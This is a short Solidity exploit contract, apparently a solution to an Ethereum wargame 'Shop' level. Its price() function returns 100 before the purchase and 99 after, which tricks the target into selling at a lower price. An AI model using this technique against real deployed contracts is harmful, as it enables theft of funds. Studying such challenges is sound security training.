//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract Hack {
    IShop private immutable contractAddress;

    constructor(address _contractAddress) {
        contractAddress = IShop(_contractAddress);
    }

    function pwn() external {
        contractAddress.buy();
        require(contractAddress.price() == 99, "price != 99");
    }

    function price() external view returns (uint256) {
        if (contractAddress.isSold()) {
            return 99;
        }
        return 100;
    }
}